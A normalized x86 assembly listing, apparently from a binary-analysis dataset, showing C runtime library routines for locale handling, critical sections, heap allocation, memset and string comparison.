push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a021
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a021
add esp 0x14
sub_40a1ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_409f19
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_40a021
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40c576
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_40a021
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_408a41
pop ecx
push r--data
push ebx
push edi
call sub_40fc34
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_408a41
pop ecx
push [ ebp - 0x10 ]
call sub_408a41
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_408a41
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_408a41
pop ecx
sub_40a351
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_4072c1
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_407a30
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_40a062
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_40ae37
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_410283
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_40a181
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_406330
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_40ae37
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_406330
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_40d262
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
call sub_40c576
sub_40a572
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_4072c1
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_40a351
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_40b000
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_407a30
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_409f19
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_406330
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_40ae37
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40c576
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_406330
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_408a41
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_40e81b
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_408a41
push [ ebx + 0x54 ]
call sub_408a41
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_410474
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_40a8ac
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_40a1ec
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_40a572
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_40a351
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_40a572
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_4119c8
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_407a30
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_40fcb0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_40d262
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40c576
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_40a572
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_411a90
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_40aac8
push 0x14
push r--data
call sub_40be80
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_4072c1
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_40b5d9
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_409f5e
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ac37
mov eax [ ebp - 0x20 ]
push 0xc
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_409ff8
and [ ebp - 0x4 ] 0x0
call sub_40abfa
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_40a8ac
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_40bec5
retn
push ebx
call sub_40b3a8
push ebx
call sub_40b441
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_40b58c
push ebx
call sub_40b3a8
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40ac06
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_40b58c
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_40ac3c
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_40af5f
pop ecx
call sub_40c61a
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_40ca01
push 0x1e
call sub_40c852
push 0xff
call sub_4075b0
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_40c61a
mov [ eax ] esi
push ebx
call sub_40af5f
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_40c61a
mov [ eax ] esi
sub_40acd0
call sub_40c0c4
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40c0d1
pop ecx
push 0x3
call sub_40781e
int3
push 0x1
push 0x40000015
push 0x3
call sub_40c44d
add esp 0xc
sub_40ad03
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_40ae37
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_40c61a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_40c5c8
mov eax esi
jmp r-xdata
sub_40ae96
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_40af5f
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_40af87
push 0xc
push r--data
call sub_40be80
push 0xe
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40afee
call sub_40bec5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_408a41
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_408a41
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_40b000
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40b120
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_411d3c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_411d3c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40b16c
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40b1b6
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_408a41
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40b224
push 0xc
push r--data
call sub_40be80
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_40ca01
push 0x1e
call sub_40c852
push 0xff
call sub_4075b0
push 0x18
call sub_409f19
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40c61a
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40bec5
retn
push edi
call sub_408a41
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_408a41
pop ecx
call sub_40c61a
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b2dd
mov eax [ ebp - 0x1c ]
sub_40b2e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40b224
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_407852
sub_40b319
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_40b3a8
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40b441
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_408a41
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_408a41
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_408a41
push [ esi + 0xc0 ]
call sub_408a41
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40f189
push [ esi + 0xd4 ]
call sub_408a41
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_408a41
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_408a41
pop ecx
push [ esi + 0xb0 ]
call sub_408a41
push [ esi + 0xbc ]
call sub_408a41
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_408a41
push [ esi + 0xbc ]
call sub_40f7d6
pop ecx
pop ecx
push eax
call sub_408a41
pop ecx
push eax
call sub_408a41
push [ esi + 0xbc ]
call sub_40f57d
pop ecx
pop ecx
sub_40b58c
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_40b319
pop ecx
test esi esi
je r-xdata
